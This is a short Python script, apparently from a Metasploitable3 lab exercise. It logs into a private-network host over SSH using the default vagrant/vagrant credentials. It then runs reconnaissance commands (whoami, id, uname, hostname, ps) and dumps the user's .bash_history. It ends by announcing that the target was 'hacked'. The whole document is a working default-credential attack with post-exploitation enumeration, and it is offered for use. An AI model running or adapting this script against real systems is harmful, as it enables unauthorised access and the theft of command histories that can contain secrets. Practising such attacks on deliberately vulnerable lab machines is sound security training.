import paramiko

hostname = "192.168.56.102"

port = 22
username="vagrant"
password = "vagrant"

client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
try:
    print(f'Connecting to {hostname}')
    client.connect(hostname, port=port, username=username, password=password)

    print('The script worked and we are connected!!')
    
    print('printing whoami:')
    stdin, stdout, stderr = client.exec_command("whoami")
    print(stdout.read().decode().strip())

    print('printing id:')
    stdin, stdout, stderr = client.exec_command("id")
    print(stdout.read().decode().strip())

    print('printing system info (uname -a):')
    stdin, stdout, stderr = client.exec_command("uname -a")
    print(stdout.read().decode().strip())

    print('printing the hostname:')
    stdin, stdout, stderr = client.exec_command("hostname")
    print(stdout.read().decode().strip())
    
    print('bash_history')
    stdin, stdout, stderr = client.exec_command("cat /home/vagrant/.bash_history")
    print(stdout.read().decode().strip())

    print('printing first 3 running processes:')
    stdin, stdout, stderr = client.exec_command("ps aux | head -3")
    print(stdout.read().decode().strip())
    
    print('Exploit we hacked the metasploitable3 successfully!')
except Exception as e:
    print('err:', e)

finally:
    client.close()
